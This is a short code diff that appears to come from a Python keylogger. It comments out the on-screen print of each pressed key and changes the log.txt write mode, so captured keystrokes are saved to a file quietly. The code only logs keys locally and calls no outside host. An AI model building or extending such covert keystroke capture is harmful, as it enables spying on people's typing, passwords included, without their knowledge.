@@ -11,7 +11,7 @@ def on_press(key):
     count += 1
 
     # Don't forgive to erase print
-    print('{0} pressed'.format(key))
+    # print('{0} pressed'.format(key))
 
     if count >= 4:
         count = 0
@@ -23,8 +23,8 @@ def on_release(key):
         return False
     
 def write_file(keys):
-    # Don't forgive to change the path or put in W
-    with open("log.txt", "a") as f:
+    # Don't forgive to change the path or put in 'w' or 'a' 
+    with open("log.txt", "w") as f:
         for key in keys:
             k = str(key).replace("'","")
 
